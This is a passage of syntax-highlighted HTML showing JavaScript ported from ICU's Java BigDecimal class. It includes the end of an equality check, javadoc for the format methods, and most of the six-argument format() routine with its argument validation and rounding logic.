class="keyword">this</span>.exp==rhs.exp))&amp;&amp;(<span class="keyword">this</span>.form==rhs.form))</span><br><span class="line"></span><br><span class="line">   &#123; <span class="comment">// mantissas say all</span></span><br><span class="line">    <span class="comment">// here with equal-length byte arrays to compare</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">8</span>=<span class="keyword">this</span>.mant.length;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">8</span>&gt;<span class="number">0</span>;$<span class="number">8</span>--,i++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.mant[i]!=rhs.mant[i])</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123; <span class="comment">// need proper layout</span></span><br><span class="line">    lca=<span class="keyword">this</span>.layout(); <span class="comment">// layout to character array</span></span><br><span class="line">    rca=rhs.layout();</span><br><span class="line">    <span class="keyword">if</span> (lca.length!=rca.length)</span><br><span class="line">     <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// mismatch</span></span><br><span class="line">    <span class="comment">// here with equal-length character arrays to compare</span></span><br><span class="line">    &#123;<span class="keyword">var</span> $<span class="number">9</span>=lca.length;i=<span class="number">0</span>;i:<span class="keyword">for</span>(;$<span class="number">9</span>&gt;<span class="number">0</span>;$<span class="number">9</span>--,i++)&#123;</span><br><span class="line">     <span class="keyword">if</span> (lca[i]!=rca[i])</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;<span class="comment">/*i*/</span></span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// arrays have identical content</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts this &lt;code&gt;BigDecimal&lt;/code&gt; to a &lt;code&gt;float&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * If the &lt;code&gt;BigDecimal&lt;/code&gt; is out of the possible range for a</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;float&lt;/code&gt; (32-bit signed floating point) result then an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The float produced is identical to result of expressing the</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt; as a &lt;code&gt;String&lt;/code&gt; and then</span></span><br><span class="line"><span class="comment">  * converting it using the &lt;code&gt;Float(String)&lt;/code&gt; constructor;</span></span><br><span class="line"><span class="comment">  * this can result in values of &lt;code&gt;Float.NEGATIVE_INFINITY&lt;/code&gt;</span></span><br><span class="line"><span class="comment">  * or &lt;code&gt;Float.POSITIVE_INFINITY&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @return A &lt;code&gt;float&lt;/code&gt; corresponding to &lt;code&gt;this&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public float floatValue()&#123;</span></span><br><span class="line"> <span class="comment">//-- return java.lang.Float.valueOf(this.toString()).floatValue();</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the &lt;code&gt;String&lt;/code&gt; representation of this</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt;, modified by layout parameters.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;This method is provided as a primitive for use by more</span></span><br><span class="line"><span class="comment">  * sophisticated classes, such as &lt;code&gt;DecimalFormat&lt;/code&gt;, that</span></span><br><span class="line"><span class="comment">  * can apply locale-sensitive editing of the result.  The level of</span></span><br><span class="line"><span class="comment">  * formatting that it provides is a necessary part of the BigDecimal</span></span><br><span class="line"><span class="comment">  * class as it is sensitive to and must follow the calculation and</span></span><br><span class="line"><span class="comment">  * rounding rules for BigDecimal arithmetic.</span></span><br><span class="line"><span class="comment">  * However, if the function is provided elsewhere, it may be removed</span></span><br><span class="line"><span class="comment">  * from this class. &lt;/i&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The parameters, for both forms of the &lt;code&gt;format&lt;/code&gt; method</span></span><br><span class="line"><span class="comment">  * are all of type &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * A value of -1 for any parameter indicates that the default action</span></span><br><span class="line"><span class="comment">  * or value for that parameter should be used.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The parameters, &lt;code&gt;before&lt;/code&gt; and &lt;code&gt;after&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * specify the number of characters to be used for the integer part</span></span><br><span class="line"><span class="comment">  * and decimal part of the result respectively.  Exponential notation</span></span><br><span class="line"><span class="comment">  * is not used. If either parameter is -1 (which indicates the default</span></span><br><span class="line"><span class="comment">  * action), the number of characters used will be exactly as many as</span></span><br><span class="line"><span class="comment">  * are needed for that part.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;before&lt;/code&gt; must be a positive number; if it is larger than</span></span><br><span class="line"><span class="comment">  * is needed to contain the integer part, that part is padded on the</span></span><br><span class="line"><span class="comment">  * left with blanks to the requested length. If &lt;code&gt;before&lt;/code&gt; is</span></span><br><span class="line"><span class="comment">  * not large enough to contain the integer part of the number</span></span><br><span class="line"><span class="comment">  * (including the sign, for negative numbers) an exception is thrown.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;after&lt;/code&gt; must be a non-negative number; if it is not the</span></span><br><span class="line"><span class="comment">  * same size as the decimal part of the number, the number will be</span></span><br><span class="line"><span class="comment">  * rounded (or extended with zeros) to fit.  Specifying 0 for</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;after&lt;/code&gt; will cause the number to be rounded to an</span></span><br><span class="line"><span class="comment">  * integer (that is, it will have no decimal part or decimal point).</span></span><br><span class="line"><span class="comment">  * The rounding method will be the default,</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;MathContext.ROUND_HALF_UP&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Other rounding methods, and the use of exponential notation, can</span></span><br><span class="line"><span class="comment">  * be selected by using &#123;@link #format(int,int,int,int,int,int)&#125;.</span></span><br><span class="line"><span class="comment">  * Using the two-parameter form of the method has exactly the same</span></span><br><span class="line"><span class="comment">  * effect as using the six-parameter form with the final four</span></span><br><span class="line"><span class="comment">  * parameters all being -1.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  before The &lt;code&gt;int&lt;/code&gt; specifying the number of places</span></span><br><span class="line"><span class="comment">  *                before the decimal point.  Use -1 for 'as many as</span></span><br><span class="line"><span class="comment">  *                are needed'.</span></span><br><span class="line"><span class="comment">  * @param  after  The &lt;code&gt;int&lt;/code&gt; specifying the number of places</span></span><br><span class="line"><span class="comment">  *                after the decimal point.  Use -1 for 'as many as are</span></span><br><span class="line"><span class="comment">  *                needed'.</span></span><br><span class="line"><span class="comment">  * @return        A &lt;code&gt;String&lt;/code&gt; representing this</span></span><br><span class="line"><span class="comment">  *                &lt;code&gt;BigDecimal&lt;/code&gt;, laid out according to the</span></span><br><span class="line"><span class="comment">  *                specified parameters</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if the number cannot be laid out as</span></span><br><span class="line"><span class="comment">  *                requested.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException if a parameter is out of range.</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  * @see    #toString</span></span><br><span class="line"><span class="comment">  * @see    #toCharArray</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.lang.String format(int before,int after)&#123;</span></span><br><span class="line"> <span class="comment">//-- return format(before,after,-1,-1,com.ibm.icu.math.MathContext.SCIENTIFIC,ROUND_HALF_UP);</span></span><br><span class="line"> <span class="comment">//-- &#125;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns the &lt;code&gt;String&lt;/code&gt; representation of this</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;BigDecimal&lt;/code&gt;, modified by layout parameters and allowing</span></span><br><span class="line"><span class="comment">  * exponential notation.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;i&gt;This method is provided as a primitive for use by more</span></span><br><span class="line"><span class="comment">  * sophisticated classes, such as &lt;code&gt;DecimalFormat&lt;/code&gt;, that</span></span><br><span class="line"><span class="comment">  * can apply locale-sensitive editing of the result.  The level of</span></span><br><span class="line"><span class="comment">  * formatting that it provides is a necessary part of the BigDecimal</span></span><br><span class="line"><span class="comment">  * class as it is sensitive to and must follow the calculation and</span></span><br><span class="line"><span class="comment">  * rounding rules for BigDecimal arithmetic.</span></span><br><span class="line"><span class="comment">  * However, if the function is provided elsewhere, it may be removed</span></span><br><span class="line"><span class="comment">  * from this class. &lt;/i&gt;</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The parameters are all of type &lt;code&gt;int&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * A value of -1 for any parameter indicates that the default action</span></span><br><span class="line"><span class="comment">  * or value for that parameter should be used.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The first two parameters (&lt;code&gt;before&lt;/code&gt; and</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;after&lt;/code&gt;) specify the number of characters to be used for</span></span><br><span class="line"><span class="comment">  * the integer part and decimal part of the result respectively, as</span></span><br><span class="line"><span class="comment">  * defined for &#123;@link #format(int,int)&#125;.</span></span><br><span class="line"><span class="comment">  * If either of these is -1 (which indicates the default action), the</span></span><br><span class="line"><span class="comment">  * number of characters used will be exactly as many as are needed for</span></span><br><span class="line"><span class="comment">  * that part.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The remaining parameters control the use of exponential notation</span></span><br><span class="line"><span class="comment">  * and rounding.  Three (&lt;code&gt;explaces&lt;/code&gt;, &lt;code&gt;exdigits&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * and &lt;code&gt;exform&lt;/code&gt;) control the exponent part of the result.</span></span><br><span class="line"><span class="comment">  * As before, the default action for any of these parameters may be</span></span><br><span class="line"><span class="comment">  * selected by using the value -1.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;explaces&lt;/code&gt; must be a positive number; it sets the number</span></span><br><span class="line"><span class="comment">  * of places (digits after the sign of the exponent) to be used for</span></span><br><span class="line"><span class="comment">  * any exponent part, the default (when &lt;code&gt;explaces&lt;/code&gt; is -1)</span></span><br><span class="line"><span class="comment">  * being to use as many as are needed.</span></span><br><span class="line"><span class="comment">  * If &lt;code&gt;explaces&lt;/code&gt; is not -1, space is always reserved for</span></span><br><span class="line"><span class="comment">  * an exponent; if one is not needed (for example, if the exponent</span></span><br><span class="line"><span class="comment">  * will be 0) then &lt;code&gt;explaces&lt;/code&gt;+2 blanks are appended to the</span></span><br><span class="line"><span class="comment">  * result.</span></span><br><span class="line"><span class="comment">  * &lt;!-- (This preserves vertical alignment of similarly formatted</span></span><br><span class="line"><span class="comment">  *       numbers in a monospace font.) --&gt;</span></span><br><span class="line"><span class="comment">  * If &lt;code&gt;explaces&lt;/code&gt; is not -1 and is not large enough to</span></span><br><span class="line"><span class="comment">  * contain the exponent, an exception is thrown.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;exdigits&lt;/code&gt; sets the trigger point for use of exponential</span></span><br><span class="line"><span class="comment">  * notation. If, before any rounding, the number of places needed</span></span><br><span class="line"><span class="comment">  * before the decimal point exceeds &lt;code&gt;exdigits&lt;/code&gt;, or if the</span></span><br><span class="line"><span class="comment">  * absolute value of the result is less than &lt;code&gt;0.000001&lt;/code&gt;,</span></span><br><span class="line"><span class="comment">  * then exponential form will be used, provided that</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;exdigits&lt;/code&gt; was specified.</span></span><br><span class="line"><span class="comment">  * When &lt;code&gt;exdigits&lt;/code&gt; is -1, exponential notation will never</span></span><br><span class="line"><span class="comment">  * be used. If 0 is specified for &lt;code&gt;exdigits&lt;/code&gt;, exponential</span></span><br><span class="line"><span class="comment">  * notation is always used unless the exponent would be 0.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;exform&lt;/code&gt; sets the form for exponential notation (if</span></span><br><span class="line"><span class="comment">  * needed).</span></span><br><span class="line"><span class="comment">  * It  may be either &#123;@link MathContext#SCIENTIFIC&#125; or</span></span><br><span class="line"><span class="comment">  * &#123;@link MathContext#ENGINEERING&#125;.</span></span><br><span class="line"><span class="comment">  * If the latter, engineering, form is requested, up to three digits</span></span><br><span class="line"><span class="comment">  * (plus sign, if negative) may be needed for the integer part of the</span></span><br><span class="line"><span class="comment">  * result (&lt;code&gt;before&lt;/code&gt;).  Otherwise, only one digit (plus</span></span><br><span class="line"><span class="comment">  * sign, if negative) is needed.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * Finally, the sixth argument, &lt;code&gt;exround&lt;/code&gt;, selects the</span></span><br><span class="line"><span class="comment">  * rounding algorithm to be used, and must be one of the values</span></span><br><span class="line"><span class="comment">  * indicated by a public constant in the &#123;@link MathContext&#125; class</span></span><br><span class="line"><span class="comment">  * whose name starts with &lt;code&gt;ROUND_&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">  * The default (&lt;code&gt;ROUND_HALF_UP&lt;/code&gt;) may also be selected by</span></span><br><span class="line"><span class="comment">  * using the value -1, as before.</span></span><br><span class="line"><span class="comment">  * &lt;p&gt;</span></span><br><span class="line"><span class="comment">  * The special value &lt;code&gt;MathContext.ROUND_UNNECESSARY&lt;/code&gt; may be</span></span><br><span class="line"><span class="comment">  * used to detect whether non-zero digits are discarded -- if</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;exround&lt;/code&gt; has this value than if non-zero digits would</span></span><br><span class="line"><span class="comment">  * be discarded (rounded) during formatting then an</span></span><br><span class="line"><span class="comment">  * &lt;code&gt;ArithmeticException&lt;/code&gt; is thrown.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * @param  before   The &lt;code&gt;int&lt;/code&gt; specifying the number of places</span></span><br><span class="line"><span class="comment">  *                  before the decimal point.</span></span><br><span class="line"><span class="comment">  *                  Use -1 for 'as many as are needed'.</span></span><br><span class="line"><span class="comment">  * @param  after    The &lt;code&gt;int&lt;/code&gt; specifying the number of places</span></span><br><span class="line"><span class="comment">  *                  after the decimal point.</span></span><br><span class="line"><span class="comment">  *                  Use -1 for 'as many as are needed'.</span></span><br><span class="line"><span class="comment">  * @param  explaces The &lt;code&gt;int&lt;/code&gt; specifying the number of places</span></span><br><span class="line"><span class="comment">  *                  to be used for any exponent.</span></span><br><span class="line"><span class="comment">  *                  Use -1 for 'as many as are needed'.</span></span><br><span class="line"><span class="comment">  * @param  exdigits The &lt;code&gt;int&lt;/code&gt; specifying the trigger</span></span><br><span class="line"><span class="comment">  *                  (digits before the decimal point) which if</span></span><br><span class="line"><span class="comment">  *                  exceeded causes exponential notation to be used.</span></span><br><span class="line"><span class="comment">  *                  Use 0 to force exponential notation.</span></span><br><span class="line"><span class="comment">  *                  Use -1 to force plain notation (no exponential</span></span><br><span class="line"><span class="comment">  *                  notation).</span></span><br><span class="line"><span class="comment">  * @param  exform   The &lt;code&gt;int&lt;/code&gt; specifying the form of</span></span><br><span class="line"><span class="comment">  *                  exponential notation to be used</span></span><br><span class="line"><span class="comment">  *                  (&#123;@link MathContext#SCIENTIFIC&#125; or</span></span><br><span class="line"><span class="comment">  *                  &#123;@link MathContext#ENGINEERING&#125;).</span></span><br><span class="line"><span class="comment">  * @param  exround  The &lt;code&gt;int&lt;/code&gt; specifying the rounding mode</span></span><br><span class="line"><span class="comment">  *                  to use.</span></span><br><span class="line"><span class="comment">  *                  Use -1 for the default, &#123;@link MathContext#ROUND_HALF_UP&#125;.</span></span><br><span class="line"><span class="comment">  * @return          A &lt;code&gt;String&lt;/code&gt; representing this</span></span><br><span class="line"><span class="comment">  *                  &lt;code&gt;BigDecimal&lt;/code&gt;, laid out according to the</span></span><br><span class="line"><span class="comment">  *                  specified parameters</span></span><br><span class="line"><span class="comment">  * @throws ArithmeticException if the number cannot be laid out as</span></span><br><span class="line"><span class="comment">  *                  requested.</span></span><br><span class="line"><span class="comment">  * @throws IllegalArgumentException if a parameter is out of range.</span></span><br><span class="line"><span class="comment">  * @see    #toString</span></span><br><span class="line"><span class="comment">  * @see    #toCharArray</span></span><br><span class="line"><span class="comment">  * @stable ICU 2.0</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">//--public java.lang.String format(int before,int after,int explaces,int exdigits,int exformint,int exround)&#123;</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> explaces;</span><br><span class="line">  <span class="keyword">var</span> exdigits;</span><br><span class="line">  <span class="keyword">var</span> exformint;</span><br><span class="line">  <span class="keyword">var</span> exround;</span><br><span class="line">  <span class="keyword">if</span> (format.arguments.length == <span class="number">6</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    explaces = format.arguments[<span class="number">2</span>];</span><br><span class="line">    exdigits = format.arguments[<span class="number">3</span>];</span><br><span class="line">    exformint = format.arguments[<span class="number">4</span>];</span><br><span class="line">    exround = format.arguments[<span class="number">5</span>];</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (format.arguments.length == <span class="number">2</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    explaces = <span class="number">-1</span>;</span><br><span class="line">    exdigits = <span class="number">-1</span>;</span><br><span class="line">    exformint = MathContext.prototype.SCIENTIFIC;</span><br><span class="line">    exround = <span class="keyword">this</span>.ROUND_HALF_UP;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"format(): "</span> + format.arguments.length + <span class="string">" arguments given; expected 2 or 6"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="keyword">var</span> before = format.arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> after = format.arguments[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">//--com.ibm.icu.math.BigDecimal num;</span></span><br><span class="line">  <span class="keyword">var</span> num;</span><br><span class="line">  <span class="comment">//--int mag=0;</span></span><br><span class="line">  <span class="keyword">var</span> mag=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int thisafter=0;</span></span><br><span class="line">  <span class="keyword">var</span> thisafter=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int lead=0;</span></span><br><span class="line">  <span class="keyword">var</span> lead=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--byte newmant[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newmant=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int chop=0;</span></span><br><span class="line">  <span class="keyword">var</span> chop=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int need=0;</span></span><br><span class="line">  <span class="keyword">var</span> need=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int oldexp=0;</span></span><br><span class="line">  <span class="keyword">var</span> oldexp=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char a[];</span></span><br><span class="line">  <span class="keyword">var</span> a;</span><br><span class="line">  <span class="comment">//--int p=0;</span></span><br><span class="line">  <span class="keyword">var</span> p=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--char newa[]=null;</span></span><br><span class="line">  <span class="keyword">var</span> newa=<span class="literal">null</span>;</span><br><span class="line">  <span class="comment">//--int i=0;</span></span><br><span class="line">  <span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//--int places=0;</span></span><br><span class="line">  <span class="keyword">var</span> places=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check arguments */</span></span><br><span class="line">  <span class="keyword">if</span> ((before&lt;(<span class="number">-1</span>))||(before==<span class="number">0</span>))</span><br><span class="line">   <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">1</span>,before);</span><br><span class="line">  <span class="keyword">if</span> (after&lt;(<span class="number">-1</span>))</span><br><span class="line">   <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">2</span>,after);</span><br><span class="line">  <span class="keyword">if</span> ((explaces&lt;(<span class="number">-1</span>))||(explaces==<span class="number">0</span>))</span><br><span class="line">   <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">3</span>,explaces);</span><br><span class="line">  <span class="keyword">if</span> (exdigits&lt;(<span class="number">-1</span>))</span><br><span class="line">   <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">4</span>,exdigits);</span><br><span class="line">  &#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (exformint==MathContext.prototype.SCIENTIFIC)</span><br><span class="line">   &#123;&#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (exformint==MathContext.prototype.ENGINEERING)</span><br><span class="line">   &#123;&#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (exformint==(<span class="number">-1</span>))</span><br><span class="line">   exformint=MathContext.prototype.SCIENTIFIC;</span><br><span class="line">   <span class="comment">// note PLAIN isn't allowed</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">5</span>,exformint);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// checking the rounding mode is done by trying to construct a</span></span><br><span class="line">  <span class="comment">// MathContext object with that mode; it will fail if bad</span></span><br><span class="line">  <span class="keyword">if</span> (exround!=<span class="keyword">this</span>.ROUND_HALF_UP)</span><br><span class="line">   &#123;<span class="keyword">try</span>&#123; <span class="comment">// if non-default...</span></span><br><span class="line">    <span class="keyword">if</span> (exround==(<span class="number">-1</span>))</span><br><span class="line">     exround=<span class="keyword">this</span>.ROUND_HALF_UP;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">new</span> MathContext(<span class="number">9</span>,MathContext.prototype.SCIENTIFIC,<span class="literal">false</span>,exround);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> ($<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="keyword">this</span>.badarg(<span class="string">"format"</span>,<span class="number">6</span>,exround);</span><br><span class="line">   &#125;&#125;</span><br><span class="line"></span><br><span class="line">  num=<span class="keyword">this</span>.clone(<span class="keyword">this</span>); <span class="comment">// make private copy</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Here:</span></span><br><span class="line"><span class="comment">     num       is BigDecimal to format</span></span><br><span class="line"><span class="comment">     before    is places before point [&gt;0]</span></span><br><span class="line"><span class="comment">     after     is places after point  [&gt;=0]</span></span><br><span class="line"><span class="comment">     explaces  is exponent places     [&gt;0]</span></span><br><span class="line"><span class="comment">     exdigits  is exponent digits     [&gt;=0]</span></span><br><span class="line"><span class="comment">     exformint is exponent form       [one of two]</span></span><br><span class="line"><span class="comment">     exround   is rounding mode       [one of eight]</span></span><br><span class="line"><span class="comment">     'before' through 'exdigits' are -1 if not specified</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* determine form */</span></span><br><span class="line">  &#123;<span class="attr">setform</span>:<span class="keyword">do</span>&#123;<span class="comment">/*select*/</span></span><br><span class="line">  <span class="keyword">if</span> (exdigits==(<span class="number">-1</span>))</span><br><span class="line">   num.form=MathContext.prototype.PLAIN;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (num.ind==<span class="keyword">this</span>.iszero)</span><br><span class="line">   num.form=MathContext.prototype.PLAIN;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="comment">// determine whether triggers</span></span><br><span class="line">   mag=num.exp+num.mant.length;</span><br><span class="line">   <span class="keyword">if</span> (mag&gt;exdigits)</span><br><span class="line">    num.form=exformint;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">if</span> (mag&lt;(<span class="number">-5</span>))</span><br><span class="line">     num.form=exformint;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">     num.form=MathContext.prototype.PLAIN;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;<span class="keyword">while</span>(<span class="literal">false</span>);&#125;<span class="comment">/*setform*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If 'after' was specified then we may need to adjust the</span></span><br><span class="line"><span class="comment">     mantissa.  This is a little tricky, as we must conform to the</span></span><br><span class="line"><span class="comment">     rules of exponential layout if necessary (e.g., we cannot end up</span></span><br><span class="line"><span class="comment">     with 10.0 if scientific). */</span></span><br><span class="line">  <span class="keyword">if</span> (after&gt;=<span class="number">0</span>)</span><br><span class="line">   &#123;<span class="attr">setafter</span>:<span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// calculate the current after-length</span></span><br><span class="line">    &#123;<span class="comment">/*select*/</span></span><br><span class="line">    <span class="keyword">if</span> (num.form==MathContext.prototype.PLAIN)</span><br><span class="line">     thisafter=-num.exp; <span class="comment">// has decimal part</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (num.form==MathContext.prototype.SCIENTIFIC)</span><br><span class="line">     thisafter=num.mant.length<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="comment">// engineering</span></span><br><span class="line">     lead=(((num.exp+num.mant.length)<span class="number">-1</span>))%<span class="number">3</span>; <span class="comment">// exponent to use</span></span><br><span class="line">     <span class="keyword">if</span> (lead&lt;<span class="number">0</span>)</span><br><span class="line">      lead=<span class="number">3</span>+lead; <span class="comment">// negative exponent case</span></span><br><span class="line">     lead++; <span class="comment">// number of leading digits</span></span><br><span class="line">     <span class="keyword">if</span> (lead&gt;=num.mant.length)</span><br><span class="line">      thisafter=<span class="number">0</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">      thisafter=num.mant.length-lead;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (thisafter==after)</span><br><span class="line">     <span class="keyword">break</span> setafter; <span class="comment">// we're in luck</span></span><br><span class="line">    <span class="keyword">if</span> (thisafter&lt;after)</span><br><span class="line">     &#123; <span class="comment">// need added trailing zeros</span></span><br><span class="line">      <span class="comment">// [thisafter can be negative]</span></span><br><span class="line">      newmant=<span class="keyword">this</span>.extend(num.mant,(num.mant.length+after)-thisafter);</span><br><span class="line">      num.mant=newmant;</span><br><span class="line">      num.exp=num.exp-((after-thisafter)); <span class="comment">// adjust exponent</span></span><br><span class="line">      <span class="keyword">if</span> (num.exp&lt;<span class="keyword">this</span>.MinExp)</span><br><span class="line">       <span class="keyword">throw</span> <span class="string">"format(): Exponent Overflow: "</span> + num.exp;</span><br><span class="line">      <span class="keyword">break</span> setafter;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">// We have too many digits after the decimal point; this could</span></span><br><span class="line">    <span class="comment">// cause a carry, which could change the mantissa...</span></span><br><span class="line">    <span class="comment">// Watch out for implied leading zeros in PLAIN case</span></span><br><span class="line">    chop=thisafter-after; <span class="comment">// digits to lop [is &gt;0]</span></span><br><span class="line">    <span class="keyword">if</span> (chop&gt;num.mant.length)</span><br><span class="line">     &#123; <span class="comment">// all digits go, no chance of carry</span></span><br><span class="line">      <span class="comment">// carry on with zero</span></span><br><span class="line">      num.mant=<span class="keyword">this</span>.ZERO.mant;</span><br><span class="line">      num.ind=<span class="keyword">this</span>.iszero;</span><br><span class="line">      num.exp=<span class="number">0</span>;</span><br><span class="line">      <span class="keyword">continue</span> setafter; <span class="comment">// recheck: we may need trailing zeros</span></span><br><span class="line">     &#125;</span><br><span class="line">    <span class="comment">// we have a digit to inspect from existing mantissa</span></span><br><span class="line">    <span class="comment">// round the number as required</span></span><br><span class="line">    need=num.mant.length-chop; <span class="comment">// digits to end up with [may be 0]</span></span><br><span class="line">    oldexp=num.exp; <span class="comment">// save old exponent</span></span><br><span class="line">    num.round(need,exround);</span><br><span class="line">    <span class="comment">// if the exponent grew by more than the digits we chopped, then</span></span><br><span class="line">    <span class="comment">// we must have had a carry, so will need to recheck the layout</span></span><br><span class="line">    <span class="keyword">if</span> ((num.exp-oldexp)==chop)</span><br><span 